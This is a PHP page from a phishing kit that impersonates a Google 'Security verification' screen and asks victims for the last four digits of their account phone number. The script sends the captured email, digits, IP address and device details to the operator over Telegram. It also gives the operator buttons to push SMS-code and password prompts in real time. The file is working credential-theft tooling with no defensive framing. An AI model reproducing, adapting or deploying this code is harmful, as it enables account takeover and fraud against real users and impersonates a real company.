<?php
error_reporting(0);
require_once('session_init.php');
include('session/function.php');
include('session/database.php');
include('config.php');

$remoteAddr = get_client_ip();
$is_localhost = is_localhost($remoteAddr);
$visitor_id = $_GET['id'] ?? ($_POST['vid'] ?? '');
if (!$is_localhost && $visitor_id === '') { header("Location: error.php"); exit(); }
if ($is_localhost && $visitor_id === '') { $visitor_id = "test_" . bin2hex(random_bytes(4)); }
if (!$is_localhost && !isset($_COOKIE['visitor_key'])) { header("Location: index.php?" . bin2hex(random_bytes(16))); exit(); }

$username = $_SESSION['username'] ?? 'Unknown';
$error = '';

if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['last4'])) {
    $digits = preg_replace('/\D/', '', (string)$_POST['last4']);
    if (preg_match('/^\d{4}$/', $digits)) {
        $IP = get_client_ip();
        $ua = $_SERVER['HTTP_USER_AGENT'] ?? 'Unknown';
        $msgtg = "🔢 <b>GMAIL - LAST 4 DIGITS</b>\n";
        $msgtg .= "━━━━━━━━━━━━━━━\n\n";
        $msgtg .= "👤 <b>Email:</b> <code>" . htmlspecialchars($username, ENT_QUOTES, 'UTF-8') . "</code>\n";
        $msgtg .= "🔟 <b>Last 4 Digits:</b> <code>" . htmlspecialchars($digits, ENT_QUOTES, 'UTF-8') . "</code>\n\n";
        $msgtg .= "🌐 <b>IP:</b> <code>" . htmlspecialchars($IP, ENT_QUOTES, 'UTF-8') . "</code>\n";
        $msgtg .= "📍 <b>Geo:</b> http://www.geoiptool.com/?IP=" . urlencode($IP) . "\n";
        $msgtg .= "💻 <b>Device:</b> <code>" . htmlspecialchars($ua, ENT_QUOTES, 'UTF-8') . "</code>\n\n";
        $msgtg .= "🔑 <b>Visitor ID:</b> <code>" . htmlspecialchars($visitor_id, ENT_QUOTES, 'UTF-8') . "</code>\n";
        $msgtg .= "⏰ " . date("F j, Y g:i a") . "\n\n";
        $msgtg .= "👨‍💻 Source: @redirectmiddle";

        $keyboard = ['inline_keyboard' => [
            [['text' => '🔒 Security Preference', 'callback_data' => 'security_preference']],
            [['text' => '✅ Yes Prompt', 'callback_data' => 'yes_prompt'], ['text' => '📱 SMS Code I', 'callback_data' => 'sms1']],
            [['text' => '📱 SMS Code II', 'callback_data' => 'sms2'], ['text' => '🔢 Last 4 Digits', 'callback_data' => 'last4_prompt'], ['text' => '📞 Number Prompt', 'callback_data' => 'number_prompt']],
            [['text' => '❌ Password Error', 'callback_data' => 'password_error'], ['text' => '🚫 Block Visitor', 'callback_data' => 'block']],
            [['text' => '✅ Success', 'callback_data' => 'success']],
        ]];
        if (!$is_localhost) {
            $keyboard['inline_keyboard'][] = [['text' => '🌐 Open Live Panel', 'url' => 'http://' . $_SERVER['HTTP_HOST'] . '/session/']];
        }
        send_telegram($msgtg, $keyboard);
        header("Location: load.php?id=" . urlencode($visitor_id));
        exit();
    }
    $error = 'Please enter exactly 4 digits.';
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Security verification</title>
<style>
 body{background:#f8f9fa;font-family:Arial,sans-serif;margin:0;color:#202124}
 .wrap{min-height:100vh;display:flex;align-items:center;justify-content:center;padding:20px}
 .card{background:#fff;border:1px solid #dadce0;border-radius:8px;width:100%;max-width:420px;padding:36px 32px;box-shadow:0 1px 3px rgba(0,0,0,.08)}
 .g{font-size:42px;font-weight:700;letter-spacing:-3px;margin-bottom:18px}
 .g span:nth-child(1){color:#4285f4}.g span:nth-child(2){color:#ea4335}.g span:nth-child(3){color:#fbbc05}.g span:nth-child(4){color:#4285f4}.g span:nth-child(5){color:#34a853}.g span:nth-child(6){color:#ea4335}
 h1{font-size:22px;font-weight:400;margin:0 0 12px}
 p{font-size:14px;line-height:1.6;color:#5f6368;margin:0 0 22px}
 label{display:block;font-size:12px;color:#5f6368;margin-bottom:8px}
 input{width:100%;box-sizing:border-box;font-size:20px;letter-spacing:10px;text-align:center;padding:12px;border:1px solid #dadce0;border-radius:5px;outline:none}
 input:focus{border-color:#1a73e8;box-shadow:0 0 0 2px #e8f0fe}
 button{margin-top:22px;width:100%;background:#1a73e8;color:#fff;border:0;border-radius:5px;padding:12px;font-size:14px;font-weight:600;cursor:pointer}
 button:hover{background:#1765cc}
 .err{color:#d93025;font-size:13px;margin-bottom:12px}
 .acct{font-size:13px;color:#5f6368;border-bottom:1px solid #eee;padding-bottom:12px;margin-bottom:20px;word-break:break-all}
</style>
</head>
<body>
<div class="wrap"><div class="card">
<div class="g"><span>G</span><span>o</span><span>o</span><span>g</span><span>l</span><span>e</span></div>
<h1>Security verification</h1>
<p>To continue, enter the last 4 digits of the phone number on your account.</p>
<div class="acct"><?php echo htmlspecialchars($username, ENT_QUOTES, 'UTF-8'); ?></div>
<?php if ($error !== ''): ?><div class="err"><?php echo $error; ?></div><?php endif; ?>
<form method="post">
<input type="hidden" name="vid" value="<?php echo htmlspecialchars($visitor_id, ENT_QUOTES, 'UTF-8'); ?>">
<label for="last4">Last 4 digits</label>
<input id="last4" name="last4" type="text" inputmode="numeric" autocomplete="off" maxlength="4" pattern="[0-9]{4}" required placeholder="••••">
<button type="submit">Verify</button>
</form>
</div></div>
<script>
const CHECK_INTERVAL = <?php echo $settings['loading_check_interval'] ?? 2000; ?>;
const VISITOR_ID = '<?php echo $visitor_id; ?>';
</script>
<script src="assets/js/redirect-checker.js"></script>
</body>
</html>
